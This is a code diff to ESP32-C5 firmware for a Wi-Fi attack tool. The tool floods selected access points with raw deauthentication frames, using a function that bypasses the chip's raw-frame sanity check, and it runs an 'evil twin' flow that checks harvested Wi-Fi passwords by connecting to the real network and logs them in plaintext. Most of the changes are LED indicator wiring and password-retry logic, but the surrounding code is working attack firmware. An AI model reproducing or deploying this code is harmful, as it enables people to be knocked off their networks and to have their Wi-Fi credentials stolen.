@@ -26,7 +26,11 @@
 
 #include "driver/gpio.h"
 
-#define LED_GPIO GPIO_NUM_27
+#include "led_strip.h"
+
+#define NEOPIXEL_GPIO      27
+#define LED_COUNT          1
+#define RMT_RES_HZ         (10 * 1000 * 1000)  // 10 MHz
 
 
 
@@ -55,7 +59,6 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
 }
 
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
-    gpio_set_level(LED_GPIO, 1);
     ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
     ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
 }
@@ -82,6 +85,7 @@ static int g_selected_count = 0;
 char * evilTwinSSID = NULL;
 char * evilTwinPassword = NULL;
 int connectAttemptCount = 0;
+led_strip_handle_t strip;
 
 
 // Methods forward declarations
@@ -133,13 +137,17 @@ static void wifi_event_handler(void *event_handler_arg,
             ESP_LOGW(TAG, "Wi-Fi: connection to AP failed. SSID='%s', reason=%d",
                      (const char*)e->ssid, (int)e->reason);
             if (applicationState == EVIL_TWIN_PASS_CHECK) {
-                ESP_LOGW(TAG, "Evil twin: connection failed, wrong password?");
-                if (connectAttemptCount++>3) {
-                    ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up.");
+                ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
+                if (connectAttemptCount >= 3) {
+                    ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                     applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
-                    connectAttemptCount = 0;
+                } else {
+                    ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
+                    connectAttemptCount++;
+                    esp_wifi_connect();
                 }
             } else {
+                ESP_LOGW(TAG, "Set app state to IDLE");
                 applicationState = IDLE;
             }
             break;
@@ -179,10 +187,22 @@ static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *
     sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
     esp_wifi_set_config(WIFI_IF_STA, &sta_config);
     vTaskDelay(pdMS_TO_TICKS(2000));
+    ESP_LOGI(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
+    connectAttemptCount = 0;
+    ESP_LOGI(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
     esp_wifi_connect();
-    vTaskDelay(pdMS_TO_TICKS(100));
-    
-    ESP_LOGI(TAG, "Sent connect command to SSID='%s' with password='%s'", evilTwinSSID, msg);
+
+    //this would be blocking!
+    // while (connectAttemptCount<10) {
+    //     if (applicationState == EVIL_TWIN_PASS_CHECK) {
+    //         ESP_LOGW(TAG, "Evil twin: connect attempt number %d", connectAttemptCount);
+    //         esp_wifi_connect();
+    //         vTaskDelay(pdMS_TO_TICKS(1000));
+    //         connectAttemptCount++;
+    //     } else {
+    //         ESP_LOGW(TAG, "Evil twin: connect attempt number %d but state is already %d", connectAttemptCount, applicationState);
+    //     }
+    // }
 }
 
 static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
@@ -227,6 +247,17 @@ static esp_err_t wifi_init_ap_sta(void) {
 
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &mgmt_wifi_config));
     ESP_ERROR_CHECK(esp_wifi_start());
+
+    uint8_t mac[6];
+    esp_err_t ret = esp_wifi_get_mac(WIFI_IF_STA, mac);
+
+    if (ret == ESP_OK) {
+        ESP_LOGI("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
+                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    } else {
+        ESP_LOGE("MAC", "Failed to get MAC address");
+    }
+
     return ESP_OK;
 }
 
@@ -369,15 +400,19 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             wifi_ap_record_t *ap = &g_scan_results[idx];
             ESP_LOGI(TAG,"  [%d] SSID='%s' RSSI=%d Auth=%d", idx, (const char*)ap->ssid, ap->rssi, ap->authmode);
         }
+        //Main loop of deauth frames sending:
         while ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK)) {
             if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
                 ESP_LOGD(TAG,"Evil twin: sending deauth frames to %d selected APs...", g_selected_count);        
+                ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 0, 255));
+                ESP_ERROR_CHECK(led_strip_refresh(strip));
                 wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
+                ESP_ERROR_CHECK(led_strip_clear(strip));
+                ESP_ERROR_CHECK(led_strip_refresh(strip));
             }
             vTaskDelay(pdMS_TO_TICKS(100));
         }
         ESP_LOGI(TAG,"Evil twin: finished attack. Reboot your board.");
-        gpio_set_level(LED_GPIO, 0);
     } else {
         ESP_LOGI(TAG,"Evl twin: no selected APs (use select_networks).");
     }
@@ -448,10 +483,28 @@ void app_main(void) {
 
     ESP_LOGI(TAG, "Application starts (ESP32-C5)");
 
-    ESP_ERROR_CHECK(nvs_flash_init());
+    // 1. LED strip configuration
+    led_strip_config_t strip_cfg = {
+        .strip_gpio_num            = NEOPIXEL_GPIO,
+        .max_leds                  = LED_COUNT,
+        .led_model                 = LED_MODEL_WS2812,
+        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
+        .flags.invert_out          = false,
+    };
 
-    gpio_reset_pin(LED_GPIO);
-    gpio_set_direction(LED_GPIO, GPIO_MODE_OUTPUT);
+    // 2. LED Strip RMT configuration
+    led_strip_rmt_config_t rmt_cfg = {
+        .clk_src        = RMT_CLK_SRC_DEFAULT,
+        .resolution_hz  = RMT_RES_HZ,
+        .flags.with_dma = false,
+    };
+
+    // 3. strip instance
+    ESP_ERROR_CHECK(led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &strip));
+
+
+
+    ESP_ERROR_CHECK(nvs_flash_init());
 
     ESP_ERROR_CHECK(wifi_init_ap_sta());
     ESP_ERROR_CHECK(espnow_init()); 
@@ -504,6 +557,12 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
     ESP_LOGI(TAG, "Finished waiting for ESP-NOW...");
     //then, proceed with deauth frames on channels of the APs:
     for (int i = 0; i < g_selected_count; ++i) {
+
+            if (applicationState == EVIL_TWIN_PASS_CHECK ) {
+                ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here, exiting the loop...");
+                return;
+            }
+
             int idx = g_selected_indices[i];
             wifi_ap_record_t *ap_record = &g_scan_results[idx];
             ESP_LOGD(TAG, "Preparations to send deauth frame...");
@@ -518,7 +577,6 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             memcpy(&deauth_frame[10], ap_record->bssid, 6);
             memcpy(&deauth_frame[16], ap_record->bssid, 6);
             wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-
     }
 
 }
